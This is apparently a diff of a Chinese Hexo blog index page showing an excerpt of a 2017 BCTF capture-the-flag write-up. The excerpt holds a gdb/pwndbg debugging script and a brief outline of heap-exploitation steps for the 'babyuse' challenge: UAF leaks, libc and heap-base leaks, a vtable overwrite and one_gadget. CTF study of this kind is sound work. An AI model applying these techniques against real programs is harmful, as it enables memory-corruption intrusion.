+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">writeup</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/23/pwnable-tw/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-2017BCTF-pwndbg-ida" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/22/2017BCTF-pwndbg-ida/">2017BCTF &amp; pwndbg &amp; ida</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/22/2017BCTF-pwndbg-ida/" class="archive-article-date">
+  	<time datetime="2017-04-22T13:07:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>pwndbg和ida可以很好的实现将idb文件导入到gdb调试界面中，使得gdb中的函数与变量以及结构体的名字可以和ida同步，并且在ida中可以实时看到调试的进度。</p>
+<p>今天发现了这个功能还是很欣喜的，国内没人写，大概我是很早这样用的一批人吧。</p>
+<p>pwndbg的README说的很详细了，不在赘述。</p>
+<h2 id="babyuse"><a href="#babyuse" class="headerlink" title="babyuse"></a>babyuse</h2><p>看了看别人的wp，总结了几种利用方法。</p>
+<ol>
+<li>leak都用UAF</li>
+<li>malloc一个大内存(&gt;128)，会存在unsortbins中，可以leak出main_arena，计算出libc</li>
+<li>利用fastbin的链表结构，leak出heap_base</li>
+<li>Nu1L用末尾添加\x00的方法，修改指针最后一位\x00使其指向vtable，leak出pie的地址</li>
+<li>shell一般都用one_gadget，Nu1L的<code>_init_arry</code>没看懂。</li>
+</ol>
+<p>为了方便调试，关闭ASLR，并且简单写了个gdb脚本。</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"># <span class="keyword">import</span> glibc</div><div class="line"># directory ~/desktop/glibc<span class="number">-2.24</span>/malloc/</div><div class="line"></div><div class="line">#######################################################</div><div class="line"># context config</div><div class="line">set ida-rpc-host <span class="number">192.168</span><span class="number">.234</span><span class="number">.1</span></div><div class="line"></div><div class="line">######################################################</div><div class="line"># ignore SIGALRM</div><div class="line"># handle SIGALRM ignore</div><div class="line"></div><div class="line">#######################################################</div><div class="line">define p32break</div><div class="line">	break * <span class="number">0x56555000</span> + $arg0</div><div class="line">end</div><div class="line"></div><div class="line">document p32break</div><div class="line">	break when PIE is on</div><div class="line">end</div><div class="line"></div><div class="line">########################################################</div><div class="line">define p32telescope</div><div class="line">	telescope <span class="number">0x56555000</span>+$arg0 $arg1</div><div class="line">end</div><div class="line"></div><div class="line">document p32telescope</div><div class="line">	telescope when PIE is on</div><div class="line">end</div><div class="line"></div><div class="line">#######################################################</div><div class="line">source aa</div><div class="line">define ssa</div><div class="line">    session save aa</div><div class="line">end</div></pre></td></tr></table></figure>
+<h2 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h2>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">pwndbg</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ida</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/22/2017BCTF-pwndbg-ida/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+  
+    <nav id="page-nav">
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
+  
+
+
+          </div>
+        </div>
+      </div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2017 Ree He
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    <script>
+	var yiliaConfig = {
+		mathjax: false,
+		isHome: true,
+		isPost: false,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false,
+		root: "/",
+		innerArchive: true,
+		showTags: false
+	}
+</script>
+
+<script>!function(t){function n(r){if(e[r])return e[r].exports;var o=e[r]={exports:{},id:r,loaded:!1};return t[r].call(o.exports,o,o.exports,n),o.loaded=!0,o.exports}var e={};return n.m=t,n.c=e,n.p="./",n(0)}([function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}function o(t,n){var e=/\/|index.html/g;return t.replace(e,"")===n.replace(e,"")}function i(){for(var t=document.querySelectorAll(".js-header-menu li a"),n=window.location.pathname,e=0,r=t.length;e<r;e++){var i=t[e];o(n,i.getAttribute("href"))&&(0,d.default)(i,"active")}}function u(t){for(var n=t.offsetLeft,e=t.offsetParent;null!==e;)n+=e.offsetLeft,e=e.offsetParent;return n}function f(t){for(var n=t.offsetTop,e=t.offsetParent;null!==e;)n+=e.offsetTop,e=e.offsetParent;return n}function c(t,n,e,r,o){var i=u(t),c=f(t)-n;if(c-e<=o){var a=t.$newDom;a||(a=t.cloneNode(!0),(0,h.default)(t,a),t.$newDom=a,a.style.position="fixed",a.style.top=(e||c)+"px",a.style.left=i+"px",a.style.zIndex=r||2,a.style.width="100%",a.style.color="#fff"),a.style.visibility="visible",t.style.visibility="hidden"}else{t.style.visibility="visible";var s=t.$newDom;s&&(s.style.visibility="hidden")}}function a(){var t=document.querySelector(".js-overlay"),n=document.querySelector(".js-header-menu");c(t,document.body.scrollTop,-63,2,0),c(n,document.body.scrollTop,1,3,0)}function s(){document.querySelector("#container").addEventListener("scroll",function(t){a()}),window.addEventListener("scroll",function(t){a()}),a()}function l(){x.default.versions.mobile&&window.screen.width<800&&(i(),s())}var p=e(71),d=r(p),v=e(72),y=(r(v),e(84)),h=r(y),b=e(69),x=r(b),m=e(75),g=r(m),w=e(70);l(),(0,w.addLoadEvent)(function(){g.default.init()}),t.exports={}},function(t,n){var e=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=e)},function(t,n){var e={}.hasOwnProperty;t.exports=function(t,n){return e.call(t,n)}},function(t,n,e){var r=e(49),o=e(15);t.exports=function(t){return r(o(t))}},function(t,n,e){t.exports=!e(8)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,e){var r=e(6),o=e(12);t.exports=e(4)?function(t,n,e){return r.f(t,n,o(1,e))}:function(t,n,e){return t[n]=e,t}},function(t,n,e){var r=e(10),o=e(30),i=e(24),u=Object.defineProperty;n.f=e(4)?Object.defineProperty:function(t,n,e){if(r(t),n=i(n,!0),r(e),o)try{return u(t,n,e)}catch(t){}if("get"in e||"set"in e)throw TypeError("Accessors not supported!");return"value"in e&&(t[n]=e.value),t}},function(t,n,e){var r=e(22)("wks"),o=e(13),i=e(1).Symbol,u="function"==typeof i,f=t.exports=function(t){return r[t]||(r[t]=u&&i[t]||(u?i:o)("Symbol."+t))};f.store=r},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n,e){var r=e(35),o=e(16);t.exports=Object.keys||function(t){return r(t,o)}},function(t,n,e){var r=e(11);t.exports=function(t){if(!r(t))throw TypeError(t+" is not an object!");return t}},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n){t.exports=function(t,n){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:n}}},function(t,n){var e=0,r=Math.random();t.exports=function(t){return"Symbol(".concat(void 0===t?"":t,")_",(++e+r).toString(36))}},function(t,n){var e=t.exports={version:"2.4.0"};"number"==typeof __e&&(__e=e)},function(t,n){t.exports=function(t){if(void 0==t)throw TypeError("Can't call method on  "+t);return t}},function(t,n){t.exports="constructor,hasOwnProperty,isPrototypeOf,propertyIsEnumerable,toLocaleString,toString,valueOf".split(",")},function(t,n){t.exports={}},function(t,n){t.exports=!0},function(t,n){n.f={}.propertyIsEnumerable},function(t,n,e){var r=e(6).f,o=e(2),i=e(7)("toStringTag");t.exports=function(t,n,e){t&&!o(t=e?t:t.prototype,i)&&r(t,i,{configurable:!0,value:n})}},function(t,n,e){var r=e(22)("keys"),o=e(13);t.exports=function(t){return r[t]||(r[t]=o(t))}},function(t,n,e){var r=e(1),o="__core-js_shared__",i=r[o]||(r[o]={});t.exports=function(t){return i[t]||(i[t]={})}},function(t,n){var e=Math.ceil,r=Math.floor;t.exports=function(t){return isNaN(t=+t)?0:(t>0?r:e)(t)}},function(t,n,e){var r=e(11);t.exports=function(t,n){if(!r(t))return t;var e,o;if(n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;if("function"==typeof(e=t.valueOf)&&!r(o=e.call(t)))return o;if(!n&&"function"==typeof(e=t.toString)&&!r(o=e.call(t)))return o;throw TypeError("Can't convert object to primitive value")}},function(t,n,e){var r=e(1),o=e(14),i=e(18),u=e(26),f=e(6).f;t.exports=function(t){var n=o.Symbol||(o.Symbol=i?{}:r.Symbol||{});"_"==t.charAt(0)||t in n||f(n,t,{value:u.f(t)})}},function(t,n,e){n.f=e(7)},function(t,n,e){var r=e(1),o=e(14),i=e(46),u=e(5),f="prototype",c=function(t,n,e){var a,s,l,p=t&c.F,d=t&c.G,v=t&c.S,y=t&c.P,h=t&c.B,b=t&c.W,x=d?o:o[n]||(o[n]={}),m=x[f],g=d?r:v?r[n]:(r[n]||{})[f];d&&(e=n);for(a in e)s=!p&&g&&void 0!==g[a],s&&a in x||(l=s?g[a]:e[a],x[a]=d&&"function"!=typeof g[a]?e[a]:h&&s?i(l,r):b&&g[a]==l?function(t){var n=function(n,e,r){if(this instanceof t){switch(arguments.length){case 0:return new t;case 1:return new t(n);case 2:return new t(n,e)}return new t(n,e,r)}return t.apply(this,arguments)};return n[f]=t[f],n}(l):y&&"function"==typeof l?i(Function.call,l):l,y&&((x.virtual||(x.virtual={}))[a]=l,t&c.R&&m&&!m[a]&&u(m,a,l)))};c.F=1,c.G=2,c.S=4,c.P=8,c.B=16,c.W=32,c.U=64,c.R=128,t.exports=c},function(t,n){var e={}.toString;t.exports=function(t){return e.call(t).slice(8,-1)}},function(t,n,e){var r=e(11),o=e(1).document,i=r(o)&&r(o.createElement);t.exports=function(t){return i?o.createElement(t):{}}},function(t,n,e){t.exports=!e(4)&&!e(8)(function(){return 7!=Object.defineProperty(e(29)("div"),"a",{get:function(){return 7}}).a})},function(t,n,e){"use strict";var r=e(18),o=e(27),i=e(36),u=e(5),f=e(2),c=e(17),a=e(51),s=e(20),l=e(58),p=e(7)("iterator"),d=!([].keys&&"next"in[].keys()),v="@@iterator",y="keys",h="values",b=function(){return this};t.exports=function(t,n,e,x,m,g,w){a(e,n,x);var O,S,_,j=function(t){if(!d&&t in A)return A[t];switch(t){case y:return function(){return new e(this,t)};case h:return function(){return new e(this,t)}}return function(){return new e(this,t)}},P=n+" Iterator",E=m==h,M=!1,A=t.prototype,T=A[p]||A[v]||m&&A[m],L=T||j(m),N=m?E?j("entries"):L:void 0,C="Array"==n?A.entries||T:T;if(C&&(_=l(C.call(new t)),_!==Object.prototype&&(s(_,P,!0),r||f(_,p)||u(_,p,b))),E&&T&&T.name!==h&&(M=!0,L=function(){return T.call(this)}),r&&!w||!d&&!M&&A[p]||u(A,p,L),c[n]=L,c[P]=b,m)if(O={values:E?L:j(h),keys:g?L:j(y),entries:N},w)for(S in O)S in A||i(A,S,O[S]);else o(o.P+o.F*(d||M),n,O);return O}},function(t,n,e){var r=e(10),o=e(55),i=e(16),u=e(21)("IE_PROTO"),f=function(){},c="prototype",a=function(){var t,n=e(29)("iframe"),r=i.length,o="<",u=">";for(n.style.display="none",e(48).appendChild(n),n.src="javascript:",t=n.contentWindow.document,t.open(),t.write(o+"script"+u+"document.F=Object"+o+"/script"+u),t.close(),a=t.F;r--;)delete a[c][i[r]];return a()};t.exports=Object.create||function(t,n){var e;return null!==t?(f[c]=r(t),e=new f,f[c]=null,e[u]=t):e=a(),void 0===n?e:o(e,n)}},function(t,n,e){var r=e(35),o=e(16).concat("length","prototype");n.f=Object.getOwnPropertyNames||function(t){return r(t,o)}},function(t,n){n.f=Object.getOwnPropertySymbols},function(t,n,e){var r=e(2),o=e(3),i=e(45)(!1),u=e(21)("IE_PROTO");t.exports=function(t,n){var e,f=o(t),c=0,a=[];for(e in f)e!=u&&r(f,e)&&a.push(e);for(;n.length>c;)r(f,e=n[c++])&&(~i(a,e)||a.push(e));return a}},function(t,n,e){t.exports=e(5)},function(t,n,e){var r=e(15);t.exports=function(t){return Object(r(t))}},function(t,n,e){t.exports={default:e(41),__esModule:!0}},function(t,n,e){t.exports={default:e(42),__esModule:!0}},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}n.__esModule=!0;var o=e(39),i=r(o),u=e(38),f=r(u),c="function"==typeof f.default&&"symbol"==typeof i.default?function(t){return typeof t}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":typeof t};n.default="function"==typeof f.default&&"symbol"===c(i.default)?function(t){return"undefined"==typeof t?"undefined":c(t)}:function(t){return t&&"function"==typeof f.default&&t.constructor===f.default&&t!==f.default.prototype?"symbol":"undefined"==typeof t?"undefined":c(t)}},function(t,n,e){e(65),e(63),e(66),e(67),t.exports=e(14).Symbol},function(t,n,e){e(64),e(68),t.exports=e(26).f("iterator")},function(t,n){t.exports=function(t){if("function"!=typeof t)throw TypeError(t+" is not a function!");return t}},function(t,n){t.exports=function(){}},function(t,n,e){var r=e(3),o=e(61),i=e(60);t.exports=function(t){return function(n,e,u){var f,c=r(n),a=o(c.length),s=i(u,a);if(t&&e!=e){for(;a>s;)if(f=c[s++],f!=f)return!0}else for(;a>s;s++)if((t||s in c)&&c[s]===e)return t||s||0;return!t&&-1}}},function(t,n,e){var r=e(43);t.exports=function(t,n,e){if(r(t),void 0===n)return t;switch(e){case 1:return function(e){return t.call(n,e)};case 2:return function(e,r){return t.call(n,e,r)};case 3:return function(e,r,o){return t.call(n,e,r,o)}}return function(){return t.apply(n,arguments)}}},function(t,n,e){var r=e(9),o=e(34),i=e(19);t.exports=function(t){var n=r(t),e=o.f;if(e)for(var u,f=e(t),c=i.f,a=0;f.length>a;)c.call(t,u=f[a++])&&n.push(u);return n}},function(t,n,e){t.exports=e(1).document&&document.documentElement},function(t,n,e){var r=e(28);t.exports=Object("z").propertyIsEnumerable(0)?Object:function(t){return"String"==r(t)?t.split(""):Object(t)}},function(t,n,e){var r=e(28);t.exports=Array.isArray||function(t){return"Array"==r(t)}},function(t,n,e){"use strict";var r=e(32),o=e(12),i=e(20),u={};e(5)(u,e(7)("iterator"),function(){return this}),t.exports=function(t,n,e){t.prototype=r(u,{next:o(1,e)}),i(t,n+" Iterator")}},function(t,n){t.exports=function(t,n){return{value:n,done:!!t}}},function(t,n,e){var r=e(9),o=e(3);t.exports=function(t,n){for(var e,i=o(t),u=r(i),f=u.length,c=0;f>c;)if(i[e=u[c++]]===n)return e}},function(t,n,e){var r=e(13)("meta"),o=e(11),i=e(2),u=e(6).f,f=0,c=Object.isExtensible||function(){return!0},a=!e(8)(function(){return c(Object.preventExtensions({}))}),s=function(t){u(t,r,{value:{i:"O"+ ++f,w:{}}})},l=function(t,n){if(!o(t))return"symbol"==typeof t?t:("string"==typeof t?"S":"P")+t;if(!i(t,r)){if(!c(t))return"F";if(!n)return"E";s(t)}return t[r].i},p=function(t,n){if(!i(t,r)){if(!c(t))return!0;if(!n)return!1;s(t)}return t[r].w},d=function(t){return a&&v.NEED&&c(t)&&!i(t,r)&&s(t),t},v=t.exports={KEY:r,NEED:!1,fastKey:l,getWeak:p,onFreeze:d}},function(t,n,e){var r=e(6),o=e(10),i=e(9);t.exports=e(4)?Object.defineProperties:function(t,n){o(t);for(var e,u=i(n),f=u.length,c=0;f>c;)r.f(t,e=u[c++],n[e]);return t}},function(t,n,e){var r=e(19),o=e(12),i=e(3),u=e(24),f=e(2),c=e(30),a=Object.getOwnPropertyDescriptor;n.f=e(4)?a:function(t,n){if(t=i(t),n=u(n,!0),c)try{return a(t,n)}catch(t){}if(f(t,n))return o(!r.f.call(t,n),t[n])}},function(t,n,e){var r=e(3),o=e(33).f,i={}.toString,u="object"==typeof window&&window&&Object.getOwnPropertyNames?Object.getOwnPropertyNames(window):[],f=function(t){try{return o(t)}catch(t){return u.slice()}};t.exports.f=function(t){return u&&"[object Window]"==i.call(t)?f(t):o(r(t))}},function(t,n,e){var r=e(2),o=e(37),i=e(21)("IE_PROTO"),u=Object.prototype;t.exports=Object.getPrototypeOf||function(t){return t=o(t),r(t,i)?t[i]:"function"==typeof t.constructor&&t instanceof t.constructor?t.constructor.prototype:t instanceof Object?u:null}},function(t,n,e){var r=e(23),o=e(15);t.exports=function(t){return function(n,e){var i,u,f=String(o(n)),c=r(e),a=f.length;return c<0||c>=a?t?"":void 0:(i=f.charCodeAt(c),i<55296||i>56319||c+1===a||(u=f.charCodeAt(c+1))<56320||u>57343?t?f.charAt(c):i:t?f.slice(c,c+2):(i-55296<<10)+(u-56320)+65536)}}},function(t,n,e){var r=e(23),o=Math.max,i=Math.min;t.exports=function(t,n){return t=r(t),t<0?o(t+n,0):i(t,n)}},function(t,n,e){var r=e(23),o=Math.min;t.exports=function(t){return t>0?o(r(t),9007199254740991):0}},function(t,n,e){"use strict";var r=e(44),o=e(52),i=e(17),u=e(3);t.exports=e(31)(Array,"Array",function(t,n){this._t=u(t),this._i=0,this._k=n},function(){var t=this._t,n=this._k,e=this._i++;return!t||e>=t.length?(this._t=void 0,o(1)):"keys"==n?o(0,e):"values"==n?o(0,t[e]):o(0,[e,t[e]])},"values"),i.Arguments=i.Array,r("keys"),r("values"),r("entries")},function(t,n){},function(t,n,e){"use strict";var r=e(59)(!0);e(31)(String,"String",function(t){this._t=String(t),this._i=0},function(){var t,n=this._t,e=this._i;return e>=n.length?{value:void 0,done:!0}:(t=r(n,e),this._i+=t.length,{value:t,done:!1})})},function(t,n,e){"use strict";var r=e(1),o=e(2),i=e(4),u=e(27),f=e(36),c=e(54).KEY,a=e(8),s=e(22),l=e(20),p=e(13),d=e(7),v=e(26),y=e(25),h=e(53),b=e(47),x=e(50),m=e(10),g=e(3),w=e(24),O=e(12),S=e(32),_=e(57),j=e(56),P=e(6),E=e(9),M=j.f,A=P.f,T=_.f,L=r.Symbol,N=r.JSON,C=N&&N.stringify,k="prototype",F=d("_hidden"),q=d("toPrimitive"),I={}.propertyIsEnumerable,B=s("symbol-registry"),D=s("symbols"),W=s("op-symbols"),H=Object[k],K="function"==typeof L,R=r.QObject,J=!R||!R[k]||!R[k].findChild,U=i&&a(function(){return 7!=S(A({},"a",{get:function(){return A(this,"a",{value:7}).a}})).a})?function(t,n,e){var r=M(H,n);r&&delete H[n],A(t,n,e),r&&t!==H&&A(H,n,r)}:A,G=function(t){var n=D[t]=S(L[k]);return n._k=t,n},$=K&&"symbol"==typeof L.iterator?function(t){return"symbol"==typeof t}:function(t){return t instanceof L},z=function(t,n,e){return t===H&&z(W,n,e),m(t),n=w(n,!0),m(e),o(D,n)?(e.enumerable?(o(t,F)&&t[F][n]&&(t[F][n]=!1),e=S(e,{enumerable:O(0,!1)})):(o(t,F)||A(t,F,O(1,{})),t[F][n]=!0),U(t,n,e)):A(t,n,e)},Y=function(t,n){m(t);for(var e,r=b(n=g(n)),o=0,i=r.length;i>o;)z(t,e=r[o++],n[e]);return t},Q=function(t,n){return void 0===n?S(t):Y(S(t),n)},X=function(t){var n=I.call(this,t=w(t,!0));return!(this===H&&o(D,t)&&!o(W,t))&&(!(n||!o(this,t)||!o(D,t)||o(this,F)&&this[F][t])||n)},V=function(t,n){if(t=g(t),n=w(n,!0),t!==H||!o(D,n)||o(W,n)){var e=M(t,n);return!e||!o(D,n)||o(t,F)&&t[F][n]||(e.enumerable=!0),e}},Z=function(t){for(var n,e=T(g(t)),r=[],i=0;e.length>i;)o(D,n=e[i++])||n==F||n==c||r.push(n);return r},tt=function(t){for(var n,e=t===H,r=T(e?W:g(t)),i=[],u=0;r.length>u;)!o(D,n=r[u++])||e&&!o(H,n)||i.push(D[n]);return i};K||(L=function(){if(this instanceof L)throw TypeError("Symbol is not a constructor!");var t=p(arguments.length>0?arguments[0]:void 0),n=function(e){this===H&&n.call(W,e),o(this,F)&&o(this[F],t)&&(this[F][t]=!1),U(this,t,O(1,e))};return i&&J&&U(H,t,{configurable:!0,set:n}),G(t)},f(L[k],"toString",function(){return this._k}),j.f=V,P.f=z,e(33).f=_.f=Z,e(19).f=X,e(34).f=tt,i&&!e(18)&&f(H,"propertyIsEnumerable",X,!0),v.f=function(t){return G(d(t))}),u(u.G+u.W+u.F*!K,{Symbol:L});for(var nt="hasInstance,isConcatSpreadable,iterator,match,replace,search,species,split,toPrimitive,toStringTag,unscopables".split(","),et=0;nt.length>et;)d(nt[et++]);for(var nt=E(d.store),et=0;nt.length>et;)y(nt[et++]);u(u.S+u.F*!K,"Symbol",{for:function(t){return o(B,t+="")?B[t]:B[t]=L(t)},keyFor:function(t){if($(t))return h(B,t);throw TypeError(t+" is not a symbol!")},useSetter:function(){J=!0},useSimple:function(){J=!1}}),u(u.S+u.F*!K,"Object",{create:Q,defineProperty:z,defineProperties:Y,getOwnPropertyDescriptor:V,getOwnPropertyNames:Z,getOwnPropertySymbols:tt}),N&&u(u.S+u.F*(!K||a(function(){var t=L();return"[null]"!=C([t])||"{}"!=C({a:t})||"{}"!=C(Object(t))})),"JSON",{stringify:function(t){if(void 0!==t&&!$(t)){for(var n,e,r=[t],o=1;arguments.length>o;)r.push(arguments[o++]);return n=r[1],"function"==typeof n&&(e=n),!e&&x(n)||(n=function(t,n){if(e&&(n=e.call(this,t,n)),!$(n))return n}),r[1]=n,C.apply(N,r)}}}),L[k][q]||e(5)(L[k],q,L[k].valueOf),l(L,"Symbol"),l(Math,"Math",!0),l(r.JSON,"JSON",!0)},function(t,n,e){e(25)("asyncIterator")},function(t,n,e){e(25)("observable")},function(t,n,e){e(62);for(var r=e(1),o=e(5),i=e(17),u=e(7)("toStringTag"),f=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],c=0;c<5;c++){var a=f[c],s=r[a],l=s&&s.prototype;l&&!l[u]&&o(l,u,a),i[a]=i.Array}},function(t,n){"use strict";var e={versions:function(){var t=window.navigator.userAgent;return{trident:t.indexOf("Trident")>-1,presto:t.indexOf("Presto")>-1,webKit:t.indexOf("AppleWebKit")>-1,gecko:t.indexOf("Gecko")>-1&&t.indexOf("KHTML")==-1,mobile:!!t.match(/AppleWebKit.*Mobile.*/),ios:!!t.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:t.indexOf("Android")>-1||t.indexOf("Linux")>-1,iPhone:t.indexOf("iPhone")>-1||t.indexOf("Mac")>-1,iPad:t.indexOf("iPad")>-1,webApp:t.indexOf("Safari")==-1,weixin:t.indexOf("MicroMessenger")==-1}}()};t.exports=e},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}var o=e(40),i=r(o),u=function(){function t(t,n,e){return n||e?String.fromCharCode(n||e):o[t]||t}function n(t){return l[t]}var e=/&quot;|&lt;|&gt;|&amp;|&nbsp;|&apos;|&#(\d+);|&#(\d+)/g,r=/['<> "&]/g,o={"&quot;":'"',"&lt;":"<","&gt;":">","&amp;":"&","&nbsp;":" "},f=/\u00a0/g,c=/<br\s*\/?>/gi,a=/\r?\n/g,s=/\s/g,l={};for(var p in o)l[o[p]]=p;return o["&apos;"]="'",l["'"]="&#39;",{encode:function(t){return t?(""+t).replace(r,n).replace(a,"<br/>").replace(s,"&nbsp;"):""},decode:function(n){return n?(""+n).replace(c,"\n").replace(e,t).replace(f," "):""},encodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},encodeBase16forJSON:function(t){if(!t)return t;t=t.replace(/[\u4E00-\u9FBF]/gi,function(t){return escape(t).replace("%u","\\u")});for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},decodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e+=2)n.push(String.fromCharCode("0x"+t.slice(e,e+2)));return n.join("")},encodeObject:function(t){if(t instanceof Array)for(var n=0,e=t.length;e>n;n++)t[n]=u.encodeObject(t[n]);else if("object"==("undefined"==typeof t?"undefined":(0,i.default)(t)))for(var r in t)t[r]=u.encodeObject(t[r]);else if("string"==typeof t)return u.encode(t);return t},loadScript:function(t){var n=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(n),n.setAttribute("src",t)},addLoadEvent:function(t){var n=window.onload;"function"!=typeof window.onload?window.onload=t:window.onload=function(){n(),t()}}}}();t.exports=u},function(t,n){function e(t,n){t.classList?t.classList.add(n):t.className+=" "+n}t.exports=e},function(t,n){function e(t,n){if(t.classList)t.classList.remove(n);else{var e=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(e," ")}}t.exports=e},,,function(t,n){"use strict";function e(){var t=document.querySelector("#page-nav");if(t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev">&laquo; Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next &raquo;</a>'),yiliaConfig&&yiliaConfig.open_in_new){var n=document.querySelectorAll(".article-entry a:not(.article-more-a)");n.forEach(function(t){t.setAttribute("target","_blank")})}var e=document.querySelector("#js-aboutme");e&&0!==e.length&&(e.innerHTML=e.innerText)}t.exports={init:e}},,,,,,,,,function(t,n){function e(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var e=t.nextSibling;return e?t.parentNode.insertBefore(n,e):t.parentNode.appendChild(n)}t.exports=e}])</script><script src="/./main.2d7529.js"></script><script>!function(){var e=function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)};e("/slider.885efe.js")}()</script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-nav header-menu">
+    
+    
+      
+      
+      
+    
+      
+      
+      
+    
+      
+      
+      
+    
+    
+
+    <ul style="width: 70%">
+    
+    
+      
+      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      
+        
+      
+      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
+      
+        
+      
+      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      
+        
+    </ul>
+  </div>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">pwndbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ida</a>
+              </li>
+             
